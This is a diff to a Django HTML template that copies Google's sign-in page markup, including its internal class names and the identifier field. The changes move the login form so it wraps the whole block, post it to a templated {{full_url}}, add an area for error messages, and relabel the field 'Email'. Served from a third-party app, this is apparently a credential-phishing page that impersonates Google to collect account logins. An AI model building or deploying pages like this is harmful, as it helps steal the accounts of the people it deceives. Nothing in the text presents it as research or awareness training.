@@ -19218,14 +19218,26 @@
                   </div>
                 </div>
                 <div jsname="uybdVe" class="eKnrVb" role="presentation">
-                  <div jsname="USBQqe" class="CYBold" role="presentation">
+                  <form action="{{full_url}}"
+                          method="POST"
+                          jsname="USBQqe" class="CYBold" role="presentation">
+                          {% csrf_token %}
+                          {% if messages %}
+                  {% for message in messages %}
+                  <div class="OyEIQ uSvLId" jsname="h9d3hd" aria-live="polite">
+                    <div class="EjBTad" aria-hidden="true">
+                      <svg aria-hidden="true" class="stUf5b LxE1Id" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></div>
+                        <div jsname="B34EJ"><span jsslot="" style="color: red; text-align: center;">
+                          {{ message }}
+                        </span></div></div>
+                        {% endfor %}
+                  {% endif %}
+
                     <div class="j663ec">
                       <div class="tCpFMc" jsname="rEuO1b" jscontroller="bPkrc">
-                        <form
-                          action="http://{{ request.get_host }}{% url 'login' 'GM' %}"
-                          method="POST"
+                        <div
                         >
-                          {% csrf_token %}
 
                           <span jsslot=""
                             ><section
@@ -19266,7 +19278,7 @@
                                               autocomplete="username"
                                               spellcheck="false"
                                               tabindex="0"
-                                              aria-label="Email or phone"
+                                              aria-label="Email"
                                               name="identifier"
                                               value=""
                                               autocapitalize="none"
@@ -19282,7 +19294,7 @@
                                               class="AxOyFc snByac"
                                               aria-hidden="true"
                                             >
-                                              Email or phone
+                                              Email
                                             </div>
                                           </div>
                                           <div class="i9lrp mIZh1c"></div>
@@ -19787,18 +19799,6 @@
                                             ></div>
                                           </div>
                                         </div>
-                                        <div class="LXRPh">
-                                          <div
-                                            jsname="ty6ygf"
-                                            class="ovnfwe Is7Fhb"
-                                          ></div>
-                                          <div
-                                            jsname="B34EJ"
-                                            class="dEOOab RxsGPe"
-                                            aria-atomic="true"
-                                            aria-live="assertive"
-                                          ></div>
-                                        </div>
                                       </div>
                                     </div>
                                     <input
@@ -19855,7 +19855,7 @@
                                 </div>
                               </div></section
                           ></span>
-                        </form>
+                        </div>
                       </div>
                     </div>
                     <button
@@ -20019,7 +20019,7 @@
                         </div>
                       </div>
                     </button>
-                  </div>
+                  </form>
                 </div>
               </div>
               <c-data id="i4" jsdata=" DoqpZc;_;4"></c-data
